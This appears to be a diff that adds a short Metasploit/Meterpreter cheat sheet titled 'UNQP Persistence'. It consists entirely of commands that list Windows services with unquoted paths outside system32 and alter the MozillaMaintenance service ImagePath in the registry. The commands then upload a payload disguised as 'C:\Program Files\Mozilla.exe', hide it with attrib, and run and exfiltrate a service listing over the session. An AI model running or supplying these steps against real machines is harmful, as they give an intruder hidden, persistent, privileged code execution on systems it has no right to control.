@@ -1,0 +1,16 @@
+[ MetaSploit UNQP Persistence ]
+wmic service get name,pathname|find /i /v "system32\"
+for /f "tokens=2" %I in ('sc query^|find "SERVICE_NAME:"') do @sc qc %I|find "BINARY"|find /i /v "system32"
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services /s|find "ImagePath"|sort|find /i /v "system32\"
+
+reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MozillaMaintenance" /v ImagePath
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ MozillaMaintenance" /v ImagePath /t REG_EXPAND_SZ /d "C:\Program Files\Mozilla Maintenance Service\maintenanceservice.exe" /f
+
+reg setval -k HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services -v MozillaMaintenance -d C:\\Program\ Files\\Mozilla\ Maintenance\ Service\\maintenanceservice.exe
+upload unqp_svc.exe C:\\Program\ Files\\Mozilla.exe
+attrib +R +S +H "C:\Program Files\Mozilla.exe"
+
+execute -H -f cmd.exe -a "/c wmic service get name,pathname > c:\\windows\\temp\\svc.txt"
+download c:\\windows\\temp\\svc.txt svc.txt
+background
+cat svc.txt|grep -v -i 'System32'
